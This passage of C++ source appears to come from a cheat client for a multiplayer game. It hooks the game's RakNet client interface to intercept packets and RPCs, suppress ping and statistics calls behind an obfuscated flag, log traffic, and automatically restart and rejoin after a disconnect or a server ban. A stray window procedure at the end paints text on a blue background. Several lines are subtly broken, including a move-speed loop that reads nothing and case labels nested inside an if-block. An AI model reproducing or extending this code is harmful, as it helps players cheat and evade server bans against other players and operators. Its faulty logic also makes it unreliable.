			else byteHealth = byteHlTemp * 7;
			picSync.byteHealth = byteHealth;
			picSync.byteArmor = byteArmour;
			bsPlayerSync.Read(picSync.byteCurrentWeapon);
			bsPlayerSync.Read(picSync.byteSpecialAction);
			for (int i = 0; i < 3; i++)
				picSync.fMoveSpeed[i];
			bsPlayerSync.Read(bHasSurfInfo);
			if (bHasSurfInfo)
			{
				bsPlayerSync.Read(picSync.sSurfingVehicleID);
				for (int i = 0; i < 3; i++)
					bsPlayerSync.Read(picSync.fSurfingOffsets[i]);
			}
			else
				picSync.sSurfingVehicleID = -1;
			bsPlayerSync.Read(bAnimation);
			if (bAnimation)
				bsPlayerSync.Read(picSync.iCurrentAnimationID);

			actor_info *me = actor_info_get(ACTOR_SELF, NULL);

			


			if (vect3_length(picSync.fMoveSpeed) > 8.0f && (vect3_dist(&me->base.matrix[12], picSync.fPosition) < 70.0f))
			{
				cheat_state_text("%s [id %i] sync rvanka on your body. Desyncing...", getPlayerName(PlayerID), PlayerID);
				p->data[0] = 255;
				return false;
			}
		}
	if (IsDisabledIncomingPacketID(IncomingPacketID))
	{
		
			p->data[0] = 255;
			 
		
	}
		if (cheat_state->_generic.crh1ggd3 == 1)
		{
			
				if (IncomingPacketID != 255)
				{
					addMessageToChatWindow("< [Packet Recv] %s -> id: %d, len: %d", getPlayerName(PlayerID), IncomingPacketID, p->length);
				}
			
		}
		while (p != nullptr)
		{
			if (OnReceivePacket(p))
				break;
			g_DrifeitClient->GetRakClientInterface()->DeallocatePacket(p);
			p = g_DrifeitClient->GetRakClientInterface()->Receive();
		}
		return p;
	}


	

void HookedRakClientInterface::DeallocatePacket( Packet *packet )
{
	traceLastFunc( "HookedRakClientInterface::DeallocatePacket" );

	unsigned char packetIdentifier;

	if ((unsigned char)packet->data[0] == ID_TIMESTAMP)
	{
		if (packet->length > sizeof(unsigned char) + sizeof(unsigned int))
			packetIdentifier = (unsigned char)packet->data[sizeof(unsigned char) + sizeof(unsigned int)];
		else return;
	}
	else packetIdentifier = (unsigned char)packet->data[0];


	switch (packetIdentifier)
	{
		if (cheat_state->_generic.crh1gg == 1)
		{
	case ID_DISCONNECTION_NOTIFICATION:
	{
		 BitStream bsSend;
		bsSend.Write((BYTE)ID_CONNECTION_LOST);
		g_DrifeitClient->Send(&bsSend, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		restartGame();
		disconnect(500);
		cheat_state->_generic.rejoinTick = GetTickCount();
	}
	break;
	case ID_CONNECTION_BANNED:
	{
		 BitStream bsSend;
		bsSend.Write((BYTE)ID_CONNECTION_LOST);
		g_DrifeitClient->Send(&bsSend, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		disconnect(0);
		g_SAMP->iGameState = GAMESTATE_WAIT_CONNECT;
	}
	break;
	case ID_CONNECTION_ATTEMPT_FAILED:
	{
		restartGame();
		disconnect(500);
		cheat_state->_generic.rejoinTick = GetTickCount();
	}
	break;
	case ID_NO_FREE_INCOMING_CONNECTIONS:
	{
		restartGame();
		disconnect(500);
		cheat_state->_generic.rejoinTick = GetTickCount();
	}
	break;
	case ID_INVALID_PASSWORD:
	{
		restartGame();
		disconnect(500);
		cheat_state->_generic.rejoinTick = GetTickCount();
	}
	break;
		}
	}
	g_DrifeitClient->GetRakClientInterface()->DeallocatePacket(packet);
}

void HookedRakClientInterface::PingServer( void )
{
	traceLastFunc( "HookedRakClientInterface::PingServer" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->PingServer();
}

void HookedRakClientInterface::PingServer( const char* host, unsigned short serverPort, unsigned short clientPort, bool onlyReplyOnAcceptingConnections )
{
	traceLastFunc( "HookedRakClientInterface::PingServer" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->PingServer( host, serverPort, clientPort, onlyReplyOnAcceptingConnections );
}

int HookedRakClientInterface::GetAveragePing( void )
{
	traceLastFunc( "HookedRakClientInterface::GetAveragePing" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetAveragePing();
}

int HookedRakClientInterface::GetLastPing( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetLastPing" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetLastPing();
}

int HookedRakClientInterface::GetLowestPing( void ) const
{		
	traceLastFunc( "HookedRakClientInterface::GetLowestPing" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetLowestPing();
}

int HookedRakClientInterface::GetPlayerPing( const PlayerID playerId )
{
	traceLastFunc( "HookedRakClientInterface::GetPlayerPing" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetPlayerPing( playerId );
}

void HookedRakClientInterface::StartOccasionalPing( void )
{
	traceLastFunc( "HookedRakClientInterface::StartOccasionalPing" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->StartOccasionalPing();
}

void HookedRakClientInterface::StopOccasionalPing( void )
{
	traceLastFunc( "HookedRakClientInterface::StopOccasionalPing" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->StopOccasionalPing();
}

bool HookedRakClientInterface::IsConnected( void ) const
{
	traceLastFunc( "HookedRakClientInterface::IsConnected" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->IsConnected();
}

unsigned int HookedRakClientInterface::GetSynchronizedRandomInteger( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetSynchronizedRandomInteger" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetSynchronizedRandomInteger();
}

bool HookedRakClientInterface::GenerateCompressionLayer( unsigned int inputFrequencyTable[ 256 ], bool inputLayer )
{
	traceLastFunc( "HookedRakClientInterface::GenerateCompressionLayer" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GenerateCompressionLayer( inputFrequencyTable, inputLayer );
}

bool HookedRakClientInterface::DeleteCompressionLayer( bool inputLayer )
{
	traceLastFunc( "HookedRakClientInterface::DeleteCompressionLayer" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->DeleteCompressionLayer( inputLayer );
}

void HookedRakClientInterface::RegisterAsRemoteProcedureCall(int* uniqueID, void(*functionPointer) (RPCParameters *rpcParms))
{
	traceLastFunc( "HookedRakClientInterface::RegisterAsRemoteProcedureCall" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->RegisterAsRemoteProcedureCall(uniqueID, functionPointer);
}

void HookedRakClientInterface::RegisterClassMemberRPC( int* uniqueID, void *functionPointer )
{
	traceLastFunc( "HookedRakClientInterface::RegisterClassMemberRPC" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->RegisterClassMemberRPC( uniqueID, functionPointer );
}

void HookedRakClientInterface::UnregisterAsRemoteProcedureCall( int* uniqueID )
{
	traceLastFunc( "HookedRakClientInterface::UnregisterAsRemoteProcedureCall" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->UnregisterAsRemoteProcedureCall( uniqueID );
}

bool HookedRakClientInterface::RPC( int* uniqueID, const char *data, unsigned int bitLength, PacketPriority priority, PacketReliability reliability, char orderingChannel, bool shiftTimestamp )
{
	traceLastFunc( "HookedRakClientInterface::RPC" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->RPC( uniqueID, data, bitLength, priority, reliability, orderingChannel, shiftTimestamp );
}

bool HookedRakClientInterface::RPC( int* uniqueID,  BitStream *parameters, PacketPriority priority, PacketReliability reliability, char orderingChannel, bool shiftTimestamp )
{
	traceLastFunc( "HookedRakClientInterface::RPC(BitStream)" );
	if (*uniqueID >= 255)return false;
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	if (uniqueID != nullptr)
	{
		if (!OnSendRPC(*uniqueID, parameters, priority, reliability, orderingChannel, shiftTimestamp))
			return false;
	}
	return g_DrifeitClient->GetRakClientInterface()->RPC( uniqueID, parameters, priority, reliability, orderingChannel, shiftTimestamp );
}

void HookedRakClientInterface::SetTrackFrequencyTable( bool b )
{
	traceLastFunc( "HookedRakClientInterface::SetTrackFrequencyTable" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->SetTrackFrequencyTable( b );
}

bool HookedRakClientInterface::GetSendFrequencyTable( unsigned int outputFrequencyTable[ 256 ] )
{
	traceLastFunc( "HookedRakClientInterface::GetSendFrequencyTable" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetSendFrequencyTable( outputFrequencyTable );
}

float HookedRakClientInterface::GetCompressionRatio( void ) const 
{
	traceLastFunc( "HookedRakClientInterface::GetCompressionRatio" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetCompressionRatio();
}

float HookedRakClientInterface::GetDecompressionRatio( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetDecompressionRatio" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetDecompressionRatio();
}

void HookedRakClientInterface::AttachPlugin(void *messageHandler)
{
	traceLastFunc( "HookedRakClientInterface::AttachPlugin" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->AttachPlugin(messageHandler);
}

void HookedRakClientInterface::DetachPlugin(void *messageHandler)
{
	traceLastFunc( "HookedRakClientInterface::DetachPlugin" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->DetachPlugin(messageHandler);
}

 BitStream * HookedRakClientInterface::GetStaticServerData( void )
{
	traceLastFunc( "HookedRakClientInterface::GetStaticServerData" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetStaticServerData();
}

void HookedRakClientInterface::SetStaticServerData( const char *data, const int length )
{
	traceLastFunc( "HookedRakClientInterface::SetStaticServerData" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->SetStaticServerData( data, length );
}

 BitStream * HookedRakClientInterface::GetStaticClientData( const PlayerID playerId )
{	
	traceLastFunc( "HookedRakClientInterface::GetStaticClientData" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetStaticClientData( playerId );
}

void HookedRakClientInterface::SetStaticClientData( const PlayerID playerId, const char *data, const int length )
{
	traceLastFunc( "HookedRakClientInterface::SetStaticClientData" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->SetStaticClientData( playerId, data, length );
}

void HookedRakClientInterface::SendStaticClientDataToServer( void )
{
	traceLastFunc( "HookedRakClientInterface::SendStaticClientDataToServer" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->SendStaticClientDataToServer();
}

PlayerID HookedRakClientInterface::GetServerID( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetServerID" );
	if (cheat_state->_generic.asasasas9ssssvg == 0)return g_DrifeitClient->GetRakClientInterface()->GetServerID();
	return g_DrifeitClient->GetRakClientInterface()->GetServerID();
}

PlayerID HookedRakClientInterface::GetPlayerID( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetPlayerID" );
	if (cheat_state->_generic.asasasas9ssssvg == 0)return g_DrifeitClient->GetRakClientInterface()->GetPlayerID();
	return g_DrifeitClient->GetRakClientInterface()->GetPlayerID();
}

PlayerID HookedRakClientInterface::GetInternalID( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetInternalID" );
	if (cheat_state->_generic.asasasas9ssssvg == 0)return g_DrifeitClient->GetRakClientInterface()->GetInternalID();
	return g_DrifeitClient->GetRakClientInterface()->GetInternalID();
}

const char* HookedRakClientInterface::PlayerIDToDottedIP( const PlayerID playerId ) const
{
	traceLastFunc( "HookedRakClientInterface::PlayerIDToDottedIP" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->PlayerIDToDottedIP( playerId );
}

void HookedRakClientInterface::PushBackPacket( Packet *packet, bool pushAtHead )
{
	traceLastFunc( "HookedRakClientInterface::PushBackPacket" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->PushBackPacket(packet, pushAtHead);
}

void HookedRakClientInterface::SetRouterInterface(void *routerInterface)
{
	traceLastFunc( "HookedRakClientInterface::SetRouterInterface" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->SetRouterInterface(routerInterface);
}
void HookedRakClientInterface::RemoveRouterInterface(void *routerInterface)
{
	traceLastFunc( "HookedRakClientInterface::RemoveRouterInterface" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->RemoveRouterInterface(routerInterface);
}

void HookedRakClientInterface::SetTimeoutTime( RakNetTime timeMS )
{
	traceLastFunc( "HookedRakClientInterface::SetTimeoutTime" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->SetTimeoutTime( timeMS );
}

bool HookedRakClientInterface::SetMTUSize( int size )
{
	traceLastFunc( "HookedRakClientInterface::SetMTUSize" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->SetMTUSize( size );
}

int HookedRakClientInterface::GetMTUSize( void ) const
{
	traceLastFunc( "HookedRakClientInterface::GetMTUSize" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetMTUSize();
}

void HookedRakClientInterface::AllowConnectionResponseIPMigration( bool allow )
{
	traceLastFunc( "HookedRakClientInterface::AllowConnectionResponseIPMigration" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->AllowConnectionResponseIPMigration( allow );
}

void HookedRakClientInterface::AdvertiseSystem( const char *host, unsigned short remotePort, const char *data, int dataLength )
{
	traceLastFunc( "HookedRakClientInterface::AdvertiseSystem" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->AdvertiseSystem( host, remotePort, data, dataLength );
}

RakNetStatisticsStruct* const HookedRakClientInterface::GetStatistics( void )
{
	traceLastFunc( "HookedRakClientInterface::GetStatistics" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetStatistics();
}

void HookedRakClientInterface::ApplyNetworkSimulator( double maxSendBPS, unsigned short minExtraPing, unsigned short extraPingVariance)
{
	traceLastFunc( "HookedRakClientInterface::ApplyNetworkSimulator" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	g_DrifeitClient->GetRakClientInterface()->ApplyNetworkSimulator( maxSendBPS, minExtraPing, extraPingVariance );
}

bool HookedRakClientInterface::IsNetworkSimulatorActive( void )
{
	traceLastFunc( "HookedRakClientInterface::IsNetworkSimulatorActive" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->IsNetworkSimulatorActive();
}

PlayerIndex HookedRakClientInterface::GetPlayerIndex( void )
{
	traceLastFunc( "HookedRakClientInterface::GetPlayerIndex" );
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;
	return g_DrifeitClient->GetRakClientInterface()->GetPlayerIndex();
}

void HookedRakClientInterface::Pad( void )
{
	if (cheat_state->_generic.asasasas9ssssvg == 1)return;
	DWORD at = (DWORD)_ReturnAddress();
	Log( "HookedRakClientInterface::Pad has been called. Return address: %p", at );
}


HDC hDC;
PAINTSTRUCT ps;
HFONT hFont;

LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	case WM_PAINT:
		hDC = BeginPaint(hwnd, &ps);

		hFont = CreateFont(
			26, 16, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
			ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
			DEFAULT_QUALITY, DEFAULT_PITCH | FF_ROMAN, "Courier New"
		);

		SelectObject(hDC, hFont);
		SetTextColor(hDC, RGB(0xFF, 0xFF, 0xFF));
		SetBkColor(hDC, RGB(0, 0, 0x77));

		PRINT_TEXT(hDC);

		DeleteObject(hFont);

		EndPaint(hwnd, &ps);
		break;
	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
	}

	return 0;
}



